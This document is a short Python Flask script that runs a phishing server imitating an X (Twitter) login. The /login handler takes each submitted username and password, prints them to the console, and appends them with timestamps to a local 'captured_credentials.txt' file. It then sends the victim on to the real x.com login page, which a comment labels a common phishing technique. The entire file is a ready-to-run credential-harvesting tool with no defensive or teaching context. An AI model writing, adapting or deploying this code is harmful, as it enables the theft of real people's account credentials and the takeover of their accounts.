from flask import Flask, render_template, request, redirect
from datetime import datetime

app = Flask(__name__)

# File to store captured credentials
CREDENTIALS_FILE = "captured_credentials.txt"


@app.route('/')
def serve_page():
    return render_template('index.html')


@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    # Log credentials to console
    print(f"\n{'='*50}")
    print(f"[CAPTURED] Time: {datetime.now()}")
    print(f"[CAPTURED] Username: {username}")
    print(f"[CAPTURED] Password: {password}")
    print(f"{'='*50}\n")

    # Save to file
    with open(CREDENTIALS_FILE, 'a') as f:
        f.write(f"Time: {datetime.now()}\n")
        f.write(f"Username: {username}\n")
        f.write(f"Password: {password}\n")
        f.write("-" * 40 + "\n")

    # Redirect to real X login page (common phishing technique)
    return redirect("https://x.com/login")


def main():
    app.run(debug=True)


if __name__ == "__main__":
    main()
